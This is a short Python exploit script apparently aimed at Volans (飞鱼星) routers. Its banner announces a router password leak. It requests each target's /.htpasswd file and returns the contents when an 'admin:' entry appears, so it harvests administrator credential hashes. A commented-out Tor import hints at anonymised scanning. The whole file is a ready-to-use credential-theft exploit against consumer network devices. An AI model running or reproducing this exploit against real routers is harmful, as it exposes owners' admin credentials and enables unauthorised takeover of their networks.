#from lib.tor import *
import requests
import re

print("飞鱼星路由器密码泄露。Keyword: volans")

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
    "Content-Type": "text/xml"
}

def exp(target):
    host,port = target.split(':')
    if port == '443':
        url = 'https://' + target
    else:
        url = 'http://' + target

    
 
    target = url + "/.htpasswd"
    resp = requests.get( target ,timeout=5)

    if "admin:" in resp.text:
        return target + "===>" + resp.text
        

    


